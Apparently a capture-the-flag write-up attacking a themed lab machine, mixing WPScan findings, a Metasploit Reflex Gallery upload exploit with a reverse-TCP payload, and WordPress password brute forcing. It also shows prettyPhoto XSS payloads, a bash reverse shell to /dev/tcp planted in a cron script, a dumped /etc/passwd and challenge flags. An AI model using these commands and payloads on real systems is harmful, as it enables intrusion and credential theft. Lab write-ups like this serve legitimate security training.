 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 5.3.17
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 5.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 5.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 5.3.18
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 5.3.20
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 5.3.20
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentytwenty
 | Location: http://{TARGET_MACHINE_IP}/music/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://{TARGET_MACHINE_IP}/music/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://{TARGET_MACHINE_IP}/music/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.1
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://{TARGET_MACHINE_IP}/music/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] reflex-gallery
 | Location: http://{TARGET_MACHINE_IP}/music/wordpress/wp-content/plugins/reflex-gallery/
 | Last Updated: 2021-03-10T02:38:00.000Z
 | [!] The version is out of date, the latest version is 3.1.7
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Reflex Gallery <= 3.1.3 - Arbitrary File Upload
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/c2496b8b-72e4-4e63-9d78-33ada3f1c674
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133
 |      - https://www.exploit-db.com/exploits/36374/
 |      - https://packetstormsecurity.com/files/130845/
 |      - https://packetstormsecurity.com/files/131515/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/
 |
 | [!] Title: Multiple Plugins - jQuery prettyPhoto DOM Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/ad9df355-9928-411c-8b09-f9969d7cf449
 |      - https://blog.anantshri.info/forgotten_disclosure_dom_xss_prettyphoto
 |      - https://github.com/scaron/prettyphoto/issues/149
 |      - https://github.com/wpscanteam/wpscan/issues/818
 |
 | Version: 3.1.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://{TARGET_MACHINE_IP}/music/wordpress/wp-content/plugins/reflex-gallery/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Sat Oct 25 06:34:27 2025
[+] Requests Done: 177
[+] Cached Requests: 5
[+] Data Sent: 48.649 KB
[+] Data Received: 458.917 KB
[+] Memory used: 252.977 MB
[+] Elapsed time: 00:00:05

##### More
With, `wpscan --url http://{TARGET_MACHINE_IP}/music/wordpress --api-token {API_TOKEN} --enumerate u`, we also get:

[i] User(s) Identified:

[+] footprintsonthemoon
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://{TARGET_MACHINE_IP}/music/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] stuart
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kripke
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] teste
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] ritinha
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 20



#### Actions

Use measploit on 'http://{TARGET_MACHINE_IP}/music/wordpress'
'Module options (exploit/unix/webapp/wp_reflexgallery_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, soc
                                         ks5h
   RHOSTS     {TARGET_MACHINE_IP}        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /music/wordpress yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.1.12        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Reflex Gallery 3.1.3
'

After this exploit with these settings, insert 'shell' to create a shell, go to /home/amy, do cat of secretdiary, and flag is there

#### WPScan bruteforce
wpscan --url http://{TARGET_MACHINE_IP}/music/wordpress --api-token {API_TOKEN} --passwords /usr/share/wordlists/rockyou.txt --usernames footprintsonthemoon --max-threads 20

### Port - 1337 - Waste

    sudo nmap -p1337 -sV {TARGET_MACHINE_IP}
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 06:19 EST
    Nmap scan report for {TARGET_MACHINE_IP}
    Host is up (0.022s latency).

    PORT     STATE SERVICE VERSION
    1337/tcp open  waste?
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port1337-TCP:V=7.95%I=7%D=11/8%Time=690F2747%P=x86_64-pc-linux-gnu%r(NU
    SF:LL,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(GenericLine
    SF:s,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(GetRequest,2
    SF:F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(HTTPOptions,2F,
    SF:"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(RTSPRequest,2F,"F
    SF:LAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(RPCCheck,2F,"FLAG-s
    SF:heldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(DNSVersionBindReqTCP,2F,
    SF:"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(DNSStatusRequestT
    SF:CP,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(Help,2F,"FL
    SF:AG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SSLSessionReq,2F,"FL
    SF:AG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(TerminalServerCookie
    SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(TLSSessionReq
    SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(Kerberos,2F,"
    SF:FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SMBProgNeg,2F,"FLA
    SF:G-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(X11Probe,2F,"FLAG-she
    SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(FourOhFourRequest,2F,"FLAG
    SF:-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LPDString,2F,"FLAG-she
    SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LDAPSearchReq,2F,"FLAG-she
    SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LDAPBindReq,2F,"FLAG-sheld
    SF:on{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SIPOptions,2F,"FLAG-sheldon{
    SF:cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LANDesk-RC,2F,"FLAG-sheldon{cf8
    SF:8b37e8cb10c4005c1f2781a069cf8}\n")%r(TerminalServer,2F,"FLAG-sheldon{cf
    SF:88b37e8cb10c4005c1f2781a069cf8}\n")%r(NCP,2F,"FLAG-sheldon{cf88b37e8cb1
    SF:0c4005c1f2781a069cf8}\n")%r(NotesRPC,2F,"FLAG-sheldon{cf88b37e8cb10c400
    SF:5c1f2781a069cf8}\n")%r(JavaRMI,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f27
    SF:81a069cf8}\n")%r(WMSRequest,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a
    SF:069cf8}\n")%r(oracle-tns,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069
    SF:cf8}\n")%r(ms-sql-s,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\
    SF:n")%r(afp,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(giop
    SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n");


### Other infos

Works
Example:
http://{TARGET_MACHINE_IP}/music/wordpress/#prettyPhoto[gallery]/1,<a onclick="alert(/esto-es-una-prueba/);">/

http://{TARGET_MACHINE_IP}/music/wordpress/#prettyPhoto[gallery]/1,<a onclick="location.href='/music/wordpress/wp-admin/'">/


cd leonard
ls
thermostat_set_temp.sh
cat thermostat_set_temp.sh
##### Version 1

bash -i >& /dev/tcp/10.0.1.20/9999 0>&1

##### Version 2

```
    cat thermostat_set_temp.sh

    #!/bin/bash
    # This script is empty for now, I will code it as soon as I have free time.
    # This script will secretly connect to our IoT thermostat and always set the 
    # temperature in the value I wish overiding Sheldons' settings without him even knowing.
    # Even if Sheldon changes the value my script is already configured to run every minute
    # and change the value again and again!
    # I am so smart
    # Now I just have to code it...

    # MAKE API CALL TO THERMOSTAT TO SET TEMP_VALUE=22
```

Get error that says that it cannot run on a script, it has to run directly on a bash (does not work)
Run:
    - bash -c "bash -i >& /dev/tcp/10.0.1.20/9999 0>&1"

cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    syslog:x:104:108::/home/syslog:/bin/false
    _apt:x:105:65534::/nonexistent:/bin/false
    lxd:x:106:65534::/var/lib/lxd/:/bin/false
    mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
    messagebus:x:108:112::/var/run/dbus:/bin/false
    uuidd:x:109:113::/run/uuidd:/bin/false
    dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
    sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
    funwithflags:x:1000:1000:funwithflags,,,:/home/funwithflags:/bin/bash
    penny:x:1001:1001::/home/penny:
    bernadette:x:1002:1002::/home/bernadette:
    howard:x:1003:1003::/home/howard:
    raj:x:1004:1004::/home/raj:
    amy:x:1005:1005::/home/amy:
    leonard:x:1006:1006::/home/leonard:
    sheldon:x:1007:1007::/home/sheldon:
    ftp:x:112:119:ftp daemon,,,:/srv/ftp:/bin/false

### Directory Fuzzing

Because 'Upload directory has listing enabled'

gobuster dir -u http://{TARGET_MACHINE_IP}/music/wordpress/ -w /home/kali/wordlists/SecLists/Discovery/Web-Content/big.txt -t 50
gobuster fuzz -u http://{TARGET_MACHINE_IP}/music/wordpress/ -w /home/kali/wordlists/SecLists/Discovery/Web-Content/big.txt -t 50

### Redirect

http://{TARGET_MACHINE_IP}/music/wordpress/#prettyPhoto[gallery]/1,<a onclick="location.href='/music/wordpress/wp-content/uploads/.htpasswd';">/

http://{TARGET_MACHINE_IP}/music/wordpress/#prettyPhoto[gallery]/1,<a onclick="alert(/esto-es-una-prueba/);">/

music/wordpress/wp-content/uploads/.htpasswd

#### Use XMLRPC vulnerability to try to login
scanner/http/wordpress_xmlrpc_login) > show options

Module options (auxiliary/scanner/http/wordpress_xmlrpc_login):

   Name              Current Setting                 Required  Description
   ----              ---------------                 --------  -----------
   ANONYMOUS_LOGIN   false                           yes       Attempt to login with a blank username and password
   BRUTEFORCE_SPEED  5                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                           no        Try each user/password couple stored in the current da
                                                               tabase
   DB_ALL_PASS       false                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                           no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                            no        Skip existing credentials stored in the current databa
                                                               se (Accepted: none, user, user&realm)
   PASSWORD                                          no        A specific password to authenticate with
   PASS_FILE         /home/kali/wordlists/SecLists/  no        File containing passwords, one per line
                     Passwords/Most-Popular-Letter-
                     Passes.txt
   Proxies                                           no        A proxy chain of format type:host:port[,type:host:port
                                                               ][...]. Supported proxies: sapni, socks4, socks5, http
                                                               , socks5h
   RHOSTS            {TARGET_MACHINE_IP}                       yes       The target host(s), see https://docs.metasploit.com/do
                                                               cs/using-metasploit/basics/using-metasploit.html
   RPORT             80                              yes       The target port (TCP)
   SSL               false                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                           yes       Stop guessing when a credential works for a host
   TARGETURI         /music/wordpress/xmlrpc.php     yes       The base path to the wordpress application
   THREADS           1                               yes       The number of concurrent threads (max one per host)
   USERNAME          footprintsonthemoon             no        A specific username to authenticate as
   USERPASS_FILE                                     no        File containing users and passwords separated by space
                                                               , one pair per line
   USER_AS_PASS      false                           no        Try the username as the password for all users
   USER_FILE                                         no        File containing usernames, one per line
   VERBOSE           true                            yes       Whether to print output for all attempts
   VHOST                                             no        HTTP server virtual host

/home/kali/wordlists/SecLists/Passwords/Most-Popular-Letter-Passes.txt


### SSH login (reverse shell /etc/ssh/ssh_host_dsa_key.pub)
cat ssh_host_dsa_key.pub
ssh-dss AAAAB3NzaC1kc3MAAACBALBfdrxigzwhoOtRVxFGVTDglpI7wjPZcLaDpdwjgcu0vY8cTA8q2WQbYBPRHIKhhoIT/8eR8Q2x8jAb0TQUvcY4k45416wbizSeB8GbZwJ/Kjx+afvyxpMKK7bDLnFvUdWSmLocEDa0ZYvGYjZJ7TL01P42yuvFCHL2ZVriEaM9AAAAFQCRTjGF4sObotGCa0x9q0Poo/wg5wAAAIBOWBAJRNLxMEHCOydaafHtA2Bbqm1cO2yHyJeDfT+7kbaVApX71a2LOzYdciz65k2TiLGh5IH3L+3ku3U4q+IA50dqBQ7/HIYErwkEMxiggYCaYCYctFbko7Y298acMhYK5JEm5vNT0jMBmFxouk6gH1W9QyEEcynPnBFTwULNIAAAAIAoNs4YFDkGFJT9gxpDjSSeZdolgZY52wq5MOoPl+515/9fNgL5OxkGG8/gzEljDCeUH95pIigMZiDDeLqHYwEfCs97+iBa3qH6k7rhAFomLq8xxyhjn8nBl68soJRlgRi2RJ3YHBGpV3zaWL4JJLdjqgy0JFKzyu1ykOcBkhOcfA== root@tbbt